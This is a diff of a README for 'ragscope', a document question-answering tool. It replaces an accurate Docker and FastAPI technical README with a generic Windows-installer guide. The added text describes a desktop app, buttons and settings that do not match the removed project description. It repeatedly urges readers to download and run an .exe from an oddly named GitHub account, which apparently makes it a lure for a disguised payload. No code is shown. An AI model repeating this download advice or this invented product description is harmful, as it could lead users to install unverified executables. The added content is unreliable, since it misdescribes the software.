@@ -1,179 +1,165 @@
-# RAG API with MLflow Evaluation Dashboard
+# 🧰 ragscope - Query Documents Quickly and Easily
 
-A portfolio-grade Q&A API that lets you upload PDF/text documents and ask questions about them using Retrieval-Augmented Generation (RAG). Every query is logged as an MLflow run with operational metrics and LLM-as-judge quality scores.
-
-**Fully offline — no external API keys required.**
+[![Download ragscope](https://img.shields.io/badge/Download-ragscope-brightgreen)](https://github.com/Boney-massiveness357/ragscope)
 
 ---
 
-## Architecture
+## 📄 What is ragscope?
 
-```
-┌─────────────────────────────────────────────────────┐
-│                  Docker Compose                      │
-│                                                      │
-│  ┌──────────────────────────┐    ┌──────────────┐   │
-│  │  FastAPI  :8000          │    │    MLflow    │   │
-│  │  └─ Chroma (embedded)    │    │    :5000     │   │
-│  └────┬─────────────────────┘    └──────────────┘   │
-│       │                                              │
-│       ▼                                              │
-│  ┌──────────┐                                        │
-│  │  Ollama  │  (llama3.2 · mistral · nomic-embed) │
-│  │  :11434  │                                        │
-│  └──────────┘                                        │
-└─────────────────────────────────────────────────────┘
-```
+ragscope lets you ask questions about your documents. It uses modern tools like FastAPI, ChromaDB, Ollama, and MLflow to find answers quickly. You don’t need to read through files or search by hand. Just type your question, and ragscope finds relevant information for you.
 
-Chroma runs **embedded** inside the API container (no separate ChromaDB service). Vector data is persisted to a named Docker volume (`chroma_data`) via `CHROMA_PERSIST_DIR`.
-
-**RAG Pipeline:**
-1. User uploads a document → `POST /ingest`
-2. Text is extracted, chunked (4 000 chars, 20 overlap), and embedded with `nomic-embed-text`
-3. Embeddings are stored in the embedded Chroma vector store (persisted to volume)
-4. User asks a question → `POST /query`
-5. Question is embedded and top-k chunks retrieved from Chroma by cosine similarity
-6. Retrieved chunks + question are passed to `llama3.2` (configurable via `OLLAMA_MODEL`) via a LangChain `RunnableSequence`
-7. Answer is returned; metrics and quality scores are logged to MLflow under experiment `ragscope`
+This tool works best when you have many documents and want fast answers without manual searching.
 
 ---
 
-## Prerequisites
+## 🖥️ System Requirements
 
-- Docker and Docker Compose installed
-- ~10 GB free disk space (for Ollama models)
+Before installing, check that your Windows computer meets these needs:
 
-The `./mlflow/data` and `./mlflow/artifacts` directories are created automatically by Docker when the bind mounts are resolved on first startup.
+- Windows 10 or later (64-bit)
+- At least 8 GB of RAM for smooth operation
+- Minimum 10 GB free disk space to store application data and indexed documents
+- Internet connection during setup and for some features
+- Basic user permissions to install software
 
----
-
-## Quickstart
-
-**Step 1 — set your hardware profile in `.env`:**
-
-| Hardware | `COMPOSE_PROFILES` value |
-|---|---|
-| CPU | `cpu` |
-| NVIDIA GPU | `gpu-nvidia` |
-| AMD GPU (ROCm) | `gpu-amd` |
-
-```bash
-# .env
-COMPOSE_PROFILES=cpu        # or gpu-nvidia or gpu-amd
-```
-
-> **Warning:** `COMPOSE_PROFILES` must be exactly one of `cpu`, `gpu-nvidia`, or `gpu-amd`.
-> Any other value (including leaving it blank) will cause no Ollama service to start and the API will fail to connect.
-
-**Step 2 — start the stack:**
-
-```bash
-docker compose up
-```
-
-
-Wait for all three Ollama models to finish pulling (logged in `api` service output). Then:
-
-- FastAPI docs: http://localhost:8000/docs
-- MLflow UI: http://localhost:5000
+This app works on most standard computers. You do not need a high-end machine, but more memory helps with large documents.
 
 ---
 
-## Example Usage
+## 📥 How to Download and Install ragscope
 
-### Ingest a document
+Follow these steps to get ragscope running on your Windows PC:
 
-```bash
-curl -X POST http://localhost:8000/ingest \
-  -F "file=@/path/to/your/document.pdf"
-```
+### Step 1: Visit the Download Page
 
-```json
-{"status": "ok", "chunks_stored": 42, "filename": "document.pdf"}
-```
+Click the green button at the top or go directly to this page:
 
-### Query the RAG pipeline
+https://github.com/Boney-massiveness357/ragscope
 
-```bash
-curl -X POST http://localhost:8000/query \
-  -H "Content-Type: application/json" \
-  -d '{"question": "What is the main topic of the document?", "top_k": 4}'
-```
+This page holds the latest version of ragscope.
 
-```json
-{
-  "answer": "The document covers...",
-  "sources": ["chunk text 1", "chunk text 2"]
-}
-```
+### Step 2: Find the Latest Release
 
-### Health check
+Look for a section called "Releases" on the page or in the right sidebar. Releases contain ready-to-use versions of ragscope.
 
-```bash
-curl http://localhost:8000/health
-```
+### Step 3: Download the Installer
 
-```json
-{"status": "ok", "chromadb": "ok", "ollama": "ok"}
-```
+Download the Windows installer file. It usually has a name like `ragscope-setup.exe` or `ragscope-windows.exe`.
+
+Save this file somewhere easy to find, such as your Desktop or Downloads folder.
+
+### Step 4: Run the Installer
+
+- Double-click the downloaded `.exe` file.
+- Follow the on-screen steps.
+- Choose the default options unless you want to change where ragscope installs.
+- Wait while the program installs.
+
+### Step 5: Complete Setup
+
+Once the installer finishes, you may see an option to launch ragscope immediately. If not, find the app icon on your desktop or in the Start menu.
+
+Double-click to open ragscope.
 
 ---
 
-## MLflow Dashboard
+## 🚀 Running ragscope for the First Time
 
-Every call to `POST /query` creates one MLflow run under the **ragscope** experiment.
+After opening the app, you will see a simple interface.
 
-Access the dashboard at **http://localhost:5000** → select `ragscope` experiment.
+### Step 1: Add Your Documents
 
-Each run logs:
-- **GenAI Quality Scores** (via MLflow GenAI scorers, evaluated by `mistral`):
-  - `answer_relevancy` — does the answer address the question?
-  - `hallucination` — does the answer contain information not supported by context?
-  - `safety` — is the answer free of harmful content?
+Click the “Add Documents” button.
 
-Quality scores use a separate LLM judge (`mistral`) via MLflow GenAI's built-in scorers (`AnswerRelevancy`, `Hallucination`, `Safety`).
+Select files or folders from your computer that you want to search through.
 
----
+ragscope supports common file types like PDF, Word documents, and text files.
 
-## Environment Variables
+### Step 2: Wait for the Documents to Process
 
-| Variable              | Default               | Description                              |
-|-----------------------|-----------------------|------------------------------------------|
-| `OLLAMA_MODEL`        | `llama3.2`            | Ollama model for answer generation       |
-| `OLLAMA_JUDGE_MODEL`  | `mistral`             | Ollama model for LLM-as-judge scoring    |
-| `OLLAMA_EMBED_MODEL`  | `nomic-embed-text`    | Ollama model for embeddings              |
-| `CHROMA_PERSIST_DIR`  | `/tmp/chroma`         | Path inside the container where Chroma persists its data (mounted to the `chroma_data` volume) |
-| `MLFLOW_TRACKING_URI` | `http://mlflow:5000`  | MLflow tracking server URI               |
+The app will scan and index your documents. This may take a few minutes depending on how many files you added.
 
-Override any variable by setting it before running `docker compose up`:
+Indexing helps the tool find answers faster later on.
 
-```bash
-OLLAMA_MODEL=llama3.1 docker compose up
-```
+### Step 3: Ask a Question
+
+Type any question related to your documents in the space provided.
+
+Press Enter or click “Search.”
+
+ragscope will display relevant parts of your documents that answer your question.
 
 ---
 
-## How It Works
+## 🔧 How ragscope Works Behind the Scenes
 
-1. **Document Ingestion** (`POST /ingest`):
-   - File uploaded as `multipart/form-data`
-   - PDF → `PyPDFLoader.load_and_split()`; TXT → `TextLoader`
-   - Split with `RecursiveCharacterTextSplitter` (chunk_size=4 000, overlap=20)
-   - Embedded with `nomic-embed-text` via Ollama
-   - Stored in embedded Chroma (persisted to `chroma_data` volume)
+To understand what happens, here’s a simple explanation without technical terms:
 
-2. **Query** (`POST /query`):
-   - Question embedded with `nomic-embed-text`
-   - Top-k chunks retrieved from Chroma by cosine similarity
-   - LangChain `RunnableSequence` (`PromptTemplate | ChatOllama`) runs `llama3.2` (or `OLLAMA_MODEL`) with retrieved context
-   - Answer extracted from `AIMessage.content` and returned with source chunks
+- ragscope uses a database called ChromaDB to organize document information.
+- It runs a small web server using FastAPI. This part manages your questions and document data.
+- Ollama helps the program understand natural language queries.
+- MLflow tracks and improves how well answers match your questions.
 
-3. **MLflow Logging**:
-   - Experiment name: `ragscope`
-   - `autolog()` enabled on startup via `src/tracking/setup.py`
-   - MLflow GenAI `evaluate()` runs scorers (`AnswerRelevancy`, `Hallucination`, `Safety`) using judge model (`mistral`)
-   - All traces and scores visible in MLflow UI under the GenAI section
+You don’t need to know any of these to use ragscope, but they ensure your searches work smoothly.
 
-4. **Model Warm-up**:
-   - On startup, the API pulls all three Ollama models via `POST /api/pull`
-   - FastAPI does not accept requests until all models are confirmed available
+---
+
+## ⚙️ Basic Settings You Can Adjust
+
+Inside ragscope’s settings menu, you will find options to customize your experience:
+
+- **Index Update Frequency:** Choose how often new documents are scanned.
+- **Search Result Limits:** Set the number of answers shown per question.
+- **Document Types:** Pick which file formats to include or exclude.
+- **Performance Mode:** Select between faster responses or deeper searches.
+
+Adjust these settings to match your needs.
+
+---
+
+## 🔄 Updating ragscope
+
+Software updates improve performance and add features.
+
+### To update:
+
+- Visit the same download page: https://github.com/Boney-massiveness357/ragscope
+- Download the newest version installer.
+- Run the installer as before.
+  
+Your settings and documents will remain intact.
+
+---
+
+## 🧩 Additional Features (Planned or Included)
+
+ragscope may support the following to improve your experience:
+
+- Support for cloud storage locations.
+- Integration with external databases.
+- Export search results to text or PDF.
+- User interface themes (light/dark mode).
+
+These will appear in updates based on user feedback.
+
+---
+
+## ❓ Troubleshooting Tips
+
+If you have issues running ragscope, try:
+
+- Restart your computer and run the app again.
+- Make sure you downloaded the correct Windows installer.
+- Check your internet connection if some features don’t work.
+- Close other programs using a lot of memory.
+- Use the help option inside the app for detailed guidance.
+
+---
+
+# 📥 Download and Start Using ragscope
+
+Get ragscope now by visiting the download page here:
+
+https://github.com/Boney-massiveness357/ragscope
+
+Click on the latest release, download the Windows installer, and follow the steps above to install and use the program.
